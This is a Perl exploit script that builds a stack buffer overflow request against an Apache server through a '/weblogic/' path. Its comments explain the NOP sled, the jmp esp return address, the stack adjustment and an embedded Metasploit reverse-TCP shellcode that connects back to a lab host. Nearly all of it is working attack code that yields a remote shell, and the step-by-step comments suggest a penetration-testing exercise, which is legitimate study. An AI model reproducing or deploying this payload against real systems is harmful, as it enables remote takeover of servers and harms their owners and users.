#!/usr/bin/perl

$| = 1; # turn on output buffering
$intr = "\xcc"; # Debug interrupt

# Offset was measured as 4093
# This will be covered using a NOP sled, but could be any 4093 byte input
$offnop = "\x90"x4093;

$addr = "\x0f\xbc\x05\x10"; # Address of jmp esp in Apache that does not have ASLR

$addesp = "\x81\xc4\x38\xff\xff\xff"; # Add -200 to the ESP, so the top of the stack does not sit next to the shell code

$nopesp = "\x90"x20; # Small NOP sled to cover the distance between the EIP and shell code

# windows/shell_reverse_tcp - 710 bytes
# https://metasploit.com/
# Encoder: x86/alpha_mixed
# VERBOSE=false, LHOST=192.168.219.134, LPORT=8888, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PrependMigrate=false, EXITFUNC=process, 
# AutoVerifySession=true
my $shc = 
"\x89\xe6\xdb\xd9\xd9\x76\xf4\x5f\x57\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x79\x6c\x6a\x48\x6c\x42\x63\x30\x37\x70" .
"\x73\x30\x75\x30\x6d\x59\x68\x65\x74\x71\x4f\x30\x71\x74" .
"\x4c\x4b\x72\x70\x66\x50\x4e\x6b\x31\x42\x44\x4c\x4e\x6b" .
"\x33\x62\x37\x64\x4c\x4b\x52\x52\x57\x58\x46\x6f\x4d\x67" .
"\x53\x7a\x46\x46\x46\x51\x59\x6f\x6c\x6c\x75\x6c\x35\x31" .
"\x71\x6c\x34\x42\x36\x4c\x75\x70\x69\x51\x38\x4f\x64\x4d" .
"\x33\x31\x4f\x37\x4d\x32\x5a\x52\x72\x72\x73\x67\x6e\x6b" .
"\x62\x72\x42\x30\x6e\x6b\x50\x4a\x67\x4c\x4c\x4b\x42\x6c" .
"\x42\x31\x50\x78\x69\x73\x73\x78\x53\x31\x78\x51\x46\x31" .
"\x4c\x4b\x52\x79\x75\x70\x47\x71\x79\x43\x4c\x4b\x42\x69" .
"\x47\x68\x48\x63\x65\x6a\x53\x79\x6c\x4b\x55\x64\x4e\x6b" .
"\x47\x71\x6a\x76\x30\x31\x4b\x4f\x4c\x6c\x59\x51\x78\x4f" .
"\x66\x6d\x77\x71\x6b\x77\x35\x68\x49\x70\x70\x75\x69\x66" .
"\x77\x73\x43\x4d\x78\x78\x77\x4b\x71\x6d\x66\x44\x74\x35" .
"\x7a\x44\x62\x78\x6c\x4b\x32\x78\x67\x54\x33\x31\x78\x53" .
"\x50\x66\x4e\x6b\x44\x4c\x70\x4b\x6e\x6b\x62\x78\x57\x6c" .
"\x73\x31\x5a\x73\x6c\x4b\x57\x74\x4e\x6b\x55\x51\x68\x50" .
"\x6f\x79\x30\x44\x45\x74\x54\x64\x61\x4b\x61\x4b\x51\x71" .
"\x50\x59\x62\x7a\x70\x51\x79\x6f\x39\x70\x53\x6f\x73\x6f" .
"\x63\x6a\x4e\x6b\x72\x32\x68\x6b\x6c\x4d\x53\x6d\x75\x38" .
"\x70\x33\x75\x62\x73\x30\x73\x30\x62\x48\x31\x67\x32\x53" .
"\x30\x32\x51\x4f\x42\x74\x75\x38\x70\x4c\x33\x47\x46\x46" .
"\x65\x57\x79\x6f\x79\x45\x4c\x78\x6a\x30\x53\x31\x63\x30" .
"\x67\x70\x75\x79\x39\x54\x50\x54\x56\x30\x72\x48\x54\x69" .
"\x6b\x30\x62\x4b\x43\x30\x79\x6f\x48\x55\x52\x70\x42\x70" .
"\x42\x70\x42\x70\x63\x70\x30\x50\x73\x70\x30\x50\x70\x68" .
"\x38\x6a\x76\x6f\x59\x4f\x6d\x30\x6b\x4f\x58\x55\x4f\x67" .
"\x43\x5a\x65\x55\x45\x38\x69\x50\x49\x38\x59\x4b\x6d\x56" .
"\x70\x68\x76\x62\x47\x70\x36\x42\x38\x38\x6c\x49\x58\x66" .
"\x43\x5a\x62\x30\x62\x76\x72\x77\x73\x58\x7a\x39\x4f\x55" .
"\x33\x44\x33\x51\x6b\x4f\x5a\x75\x4b\x35\x4b\x70\x33\x44" .
"\x64\x4c\x39\x6f\x42\x6e\x34\x48\x73\x45\x48\x6c\x62\x48" .
"\x6c\x30\x4c\x75\x4c\x62\x63\x66\x6b\x4f\x59\x45\x61\x78" .
"\x63\x53\x32\x4d\x35\x34\x45\x50\x6f\x79\x49\x73\x61\x47" .
"\x50\x57\x32\x77\x70\x31\x69\x66\x70\x6a\x77\x62\x52\x79" .
"\x71\x46\x48\x62\x4b\x4d\x73\x56\x7a\x67\x43\x74\x44\x64" .
"\x35\x6c\x65\x51\x45\x51\x4e\x6d\x51\x54\x47\x54\x34\x50" .
"\x49\x56\x33\x30\x70\x44\x76\x34\x46\x30\x32\x76\x32\x76" .
"\x62\x76\x77\x36\x52\x76\x30\x4e\x50\x56\x32\x76\x31\x43" .
"\x56\x36\x72\x48\x34\x39\x48\x4c\x37\x4f\x4c\x46\x69\x6f" .
"\x6a\x75\x6d\x59\x79\x70\x52\x6e\x72\x76\x63\x76\x4b\x4f" .
"\x74\x70\x32\x48\x37\x78\x4c\x47\x45\x4d\x51\x70\x6b\x4f" .
"\x48\x55\x4f\x4b\x7a\x50\x4c\x75\x59\x32\x42\x76\x70\x68" .
"\x39\x36\x6f\x65\x4f\x4d\x4f\x6d\x49\x6f\x59\x45\x37\x4c" .
"\x76\x66\x31\x6c\x74\x4a\x4b\x30\x4b\x4b\x79\x70\x51\x65" .
"\x66\x65\x6f\x4b\x62\x67\x66\x73\x43\x42\x30\x6f\x42\x4a" .
"\x45\x50\x33\x63\x39\x6f\x48\x55\x41\x41";


# Compose the payload: 
# 1) Cover the distance of the offset with the nop sled
# 2) Overwrite the EIP with the address of jmp esp
# 3) Add a small NOP sled after the address
# 4) Add -200 to the ESP, so the top of the stack is not near the shell code
# 4) Place the code for a reverse shell
$buf = $offnop. $addr. $nopesp. $addesp. $shc;

$request = "GET /weblogic/ $buf\r\n\r\n";
print $request;
